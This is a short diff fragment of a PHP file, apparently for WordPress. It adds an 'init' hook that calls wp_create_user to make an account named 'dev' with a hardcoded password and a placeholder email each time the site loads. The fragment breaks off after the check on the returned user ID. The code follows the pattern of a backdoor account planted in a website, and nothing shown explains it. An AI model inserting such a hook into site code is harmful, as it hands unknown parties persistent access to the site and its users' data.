@@ -1,3 +1,4 @@
+<?php 
 add_action('init', function (){
    $user_id =	wp_create_user('dev', '8906321475t', 't@t.com');
    if (gettype($user_id) !== 'integer' ){
